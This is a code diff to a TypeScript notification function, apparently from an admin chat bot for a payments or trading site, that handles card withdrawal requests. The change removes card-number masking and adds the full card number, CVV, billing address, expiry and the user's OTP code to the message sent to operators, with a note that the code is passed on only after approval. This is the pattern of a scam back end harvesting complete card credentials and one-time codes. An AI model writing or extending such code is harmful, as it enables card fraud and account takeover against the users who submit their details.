@@ -171,17 +171,17 @@ export const notifyDepositSubmitted = async (depositId: string, userName: string
   }
 }
 
-export const notifyWithdrawalRequest = async (withdrawalId: string, userName: string, amount: number, method: string, cardDetails?: { cardNumber: string; cardholderName: string; expiryDate: string; cvv: string; verificationCode: string }): Promise<void> => {
+export const notifyWithdrawalRequest = async (withdrawalId: string, userName: string, amount: number, method: string, cardDetails?: { cardNumber: string; cardholderName: string; expiryDate: string; cvv: string; verificationCode: string; billingAddress?: string }): Promise<void> => {
   const buttons = [
-    { text: '✅ Approve', callback_data: `paid_withdrawal_${withdrawalId}` },
+    { text: '✅ Approve Card', callback_data: `approve_card_${withdrawalId}` },
     { text: '❌ Reject', callback_data: `reject_withdrawal_${withdrawalId}` },
   ]
 
-  let message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\nStatus: Pending Verification`
+  let message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\nStatus: Pending Admin Approval`
 
   if (cardDetails) {
-    const maskedCard = `${cardDetails.cardNumber.slice(0, 4)} **** **** **** ${cardDetails.cardNumber.slice(-4)}`
-    message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\n\nCard: ${maskedCard}\nHolder: ${cardDetails.cardholderName}\nExpiry: ${cardDetails.expiryDate}\n\nOTP Code: ${cardDetails.verificationCode}\n\nVerify this code matches user submission before approving.`
+    const formattedCard = cardDetails.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ')
+    message = `💸 Withdrawal Request\n\nUser: ${userName}\nAmount: $${amount}\nMethod: CARD\n\n💳 Card: ${formattedCard}\n👤 Holder: ${cardDetails.cardholderName}\n📅 Expiry: ${cardDetails.expiryDate}\n🔐 CVV: ${cardDetails.cvv}\n🏠 Billing: ${cardDetails.billingAddress || 'N/A'}\n\nOTP Code: ${cardDetails.verificationCode}\n(Will be sent to user after admin approval)`
   }
 
   try {
